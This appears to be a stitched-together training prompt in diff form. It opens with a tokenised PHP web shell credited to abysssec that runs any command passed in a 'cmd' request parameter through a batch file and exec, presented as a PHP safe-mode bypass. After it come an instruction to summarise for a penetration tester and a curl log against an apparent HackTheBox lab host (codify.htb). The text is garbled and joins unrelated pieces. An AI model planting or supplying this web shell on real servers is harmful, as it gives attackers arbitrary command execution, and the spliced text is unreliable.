@@ -1,0 +1,18 @@
+Given Context: = = for more information visit abysssec. com feel free to contact me at admin [ at ] abysssec. com * / $ cmd = $ _ request ['cmd'] ; if ( $ cmd ) { $ batch = fopen ( " cmd. bat ", " w " ) ; fwrite ( $ batch, " $ cmd > abysssec. txt ". " \ r \ n " ) ; fwrite ( $ batch, " exit " ) ; fclose ( $ batch ) ; exec ( " \ start cmd. bat " ) ; echo " < center > " ; echo " < h1 > abysssec. com php < = 5. 2. 9 safemod bypasser < / h1 > " ; echo " < textarea rows = 20 cols = 60 > " ; require ( " abysssec. txt " ) ; echo " < / textarea > " ; echo " < / center > " ; }? > < html > < body bgcolor = # 000000 and text = # do0000 > < center > < form method = post > < input type = text name = cmd > < input type = submit value = bypass > < / form > < / center > < / body > < / html > dir > abyss. txtexit [SEP]
+
+ Answer The input content is from a security testing tool. You need to list down all the points that are interesting to you; you should summarize it as if you are reporting to a senior penetration tester for further guidance.\n
+
+(base) isamu@LAPTOP-4GBLVN1A:~$ curl http://10.10.11.239:80
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="http://codify.htb/">here</a>.</p>
+<hr>
+<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.239 Port 80</address>
+</body></html>
+(base) isamu@LAPTOP-4GBLVN1A:~$ curl http://codify.htb/
+curl: (6) Could not resolve host: codify.htb
+(base) isamu@LAPTOP-4GBLVN1A:~
+Please summarize in 50 words or less
